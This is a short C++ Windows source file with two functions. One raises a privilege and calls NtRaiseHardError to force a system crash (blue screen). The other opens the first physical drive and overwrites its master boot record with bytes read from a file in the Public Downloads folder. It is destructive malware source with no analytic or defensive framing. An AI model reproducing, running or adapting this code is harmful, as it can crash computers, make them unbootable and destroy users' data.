#pragma comment(lib, "ntdll.lib")
#include <Windows.h>
#include <iostream>

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

int BSOD() {
	BOOLEAN b;

	unsigned long response;

	RtlAdjustPrivilege(19, true, false, &b);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
	return 0;
}

int MBR() {
    DWORD write;
    char mbr[512];
    ZeroMemory(&mbr, (sizeof mbr));

    HANDLE MBR = CreateFile(L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    HANDLE BIN = CreateFile(L"C:\\Users\\Public\\Downloads\\mbr.bin",
        GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    ReadFile(BIN, mbr, 512, NULL, NULL);
    WriteFile(MBR, mbr, 512, &write, NULL);
    CloseHandle(MBR);
    CloseHandle(BIN);
    return 0;
}
